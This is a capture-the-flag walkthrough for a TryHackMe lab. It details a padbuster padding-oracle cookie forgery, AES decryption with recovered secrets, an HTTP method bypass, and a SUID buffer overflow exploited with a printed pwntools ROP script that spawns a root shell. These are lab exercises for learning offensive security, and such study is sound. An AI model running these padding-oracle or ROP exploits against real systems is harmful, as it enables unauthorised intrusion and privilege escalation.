# [hc0n Christmas CTF] (https://tryhackme.com/room/hc0nchristmasctf)

## hackt the planet

### What is the user flag?

1. First, enumerate available ports with nmap to identify running services

```bash
nmap IP
```

[SCREEN01]

2. Visiting the web service at `http://IP:8080`, we discover a ciphertext **RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=**. This appears to be Base64-encoded, likely AES-encrypted data that we'll need to decrypt later

3. Enumerate directories on the web server with gobuster to discover hidden paths

```bash
gobuster dir -u IP -w /root/Desktop/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt
```

[SCREEN02]

4. Examining `http://IP/robots.txt` provides valuable information:

   - Admin username: **administratorhc0nwithyhackme**
   - Reference to an image at `http://IP/iv.png`

5. The image at `http://IP/iv.png` contains text encoded with the Cicada 3301 cipher. Using the translation tables from [uncovering-cicada.fandom](https://uncovering-cicada.fandom.com/wiki/How_the_solved_pages_of_the_Liber_Primus_were_solved), we can decrypt it:

   - Decrypted text: **THEIVFORINGEOAEY**
   - This appears to be the Initialization Vector (IV) needed for AES decryption

6. Register a new account at `http://IP/register.php` and examine the cookies:

   - In your browser, open DevTools -> Storage -> Cookies

7. Use padbuster to perform a Padding Oracle Attack and forge a cookie for the admin user (select option **2** when prompted)

```bash
padbuster http://IP/login.php "COOKIE_VALUE" 8 --cookies hcon=COOKIE_VALUE --encoding 0 -plaintext user=administratorhc0nwithyhackme
```

[SCREEN03]

8. Replace your existing cookie with the newly generated encrypted value, then refresh the page:
   - In the admin panel, you'll find the SecretKeySpec: **hconkwithyhackme**
   - This is the encryption key needed to decrypt the AES ciphertext

[SCREEN04]

9. With all required elements now collected, we can decrypt the ciphertext from step 2:
   - Visit [AES decryption site](https://www.devglan.com/online-tools/aes-encryption-decryption)
   - Input the ciphertext: `RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=`
   - Key: `hconkwithyhackme`
   - IV: `THEIVFORINGEOAEY`
   - Mode: CBC
   - Key Size: 128 bits
   - Output Text Format: Text
   - The decrypted value reveals the SSH username: **thedarktangent**

[SCREEN05]

10. Continuing with directory enumeration, investigate `http://IP/hide-folders/`:

    - This directory contains two subdirectories: `/1/` and `/2/`
    - Accessing `/1/` results in a "Method Not Allowed" error

11. To bypass the method restriction on `/1/`:
    - In DevTools, right-click the `http://IP/hide-folders/1/` request
    - Select "Edit and Resend"
    - Change the HTTP method from `GET` to `OPTIONS`
    - This reveals the first part of the SSH password: **Gf7MRr55**

[SCREEN06]

12. To obtain the second part of the password, download the file from `http://IP/hide-folders/2/`:
    - The executable prompts for a username and password
    - Use the credentials found in the strings output: **stuxnet:n$@#PDuliL**
    - After login, it reveals the second part of the SSH password: **n$@#PDuliL**

```bash
chmod +x hola
strings hola
./hola
# login with stuxnet:n$@#PDuliL
```

[SCREEN07]
[SCREEN08]

13. Put together the password parts and login via SSH to obtain the user flag

```bash
ssh thedarktangent@IP
# Password: Gf7MRr55n$@#PDuliL
cat user.txt
```

[SCREEN09]

---

### What is the root flag?

1. Search for potential privilege escalation vectors by identifying SUID binaries:
   - this will be the `home/thedarktangent/hc0n`

```bash
find / -perm -u=s -type f 2>/dev/null
```

[SCREEN10]

2. Transfer the binary to our attacking machine for analysis:

```bash
# On target machine
python3 -m http.server
```

[SCREEN11]

```bash
# On attacking machine
wget http://IP:8000/hc0n
```

[SCREEN12]

3. Test the binary for buffer overflow vulnerabilities
   - The program crashes with a **SIGSEGV, Segmentation fault**, confirming it's vulnerable to buffer overflow.

```bash
python -c "print 'A'*200" > A.in
gdb hc0n
r < A.in
```

[SCREEN13]

4. Generate a unique pattern to identify the exact offset needed:

```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 200
```

[SCREEN14]

5. Use the generated pattern in GDB to find the exact crash point:

```bash
gdb -q hc0n
r
# When prompted, paste the generated pattern
x $rbp
# Note the value in RBP register
```

[SCREEN15]

6. Calculate the precise offset:

```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 0x6241376241366241
```

[SCREEN16]

7. Create and test a payload to verify our control of the instruction pointer

```bash
python -c "print('A'*56 + '\x43\x43\x42\x42\xfe\xfe\xff\xff')" > payload.in

gdb hc0n
r < payload.in
```

[SCREEN17]

8. Create [an exploit](https://deskel.github.io/posts/thm/hc0n-christmas-ctf) using pwntools to gain a root shell

```python
from pwn import *
import sys

HOST = "IP"
PORT = 22

def SROP_exploit(r):
	pop_rax = 0x40061f
	pop_rdi = 0x400604
	pop_rsi = 0x40060d
	pop_rdx = 0x400616
	bin_sh = 0x4006f8
	syscall = 0x4005fa

	payload = "A"*56
	payload += p64(pop_rax)
	payload += p64(59)
	payload += p64(pop_rdi)
	payload += p64(bin_sh)
	payload += p64(pop_rsi)
	payload += p64(0x0)
	payload += p64(pop_rdx)
	payload += p64(0x0)
	payload += p64(syscall)

	print(r.recvline())
	r.sendline(payload)
	r.interactive()

if __name__== "__main__":
	r = ssh(host=HOST, port=PORT, user="USERNAME", password="PASSWORD")
	s = r.run('./hc0n')
	SROP_exploit(s)
```

9. Run the exploit and obtain the root flag

```bash
pip install pwntools
python script.py

whoami
cat /root/root.txt
```

[SCREEN18]
